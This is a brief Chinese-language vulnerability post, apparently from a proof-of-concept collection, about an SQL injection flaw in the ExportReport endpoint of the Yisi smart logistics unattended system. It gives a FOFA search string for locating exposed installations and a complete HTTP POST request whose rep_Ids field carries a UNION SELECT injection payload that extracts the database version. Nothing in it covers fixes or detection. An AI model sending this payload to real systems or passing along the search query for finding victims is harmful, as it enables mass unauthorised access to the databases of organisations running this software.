## 易思智能物流无人值守系统ExportReport存在SQL注入漏洞

易思智能物流无人值守系统ExportReport存在SQL注入漏洞

## fofa

```javascript
body="/api/SingleLogin"
```

## poc

```javascript
POST /Sys_ReportFile/ExportReport HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C@@VERSION%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX
```

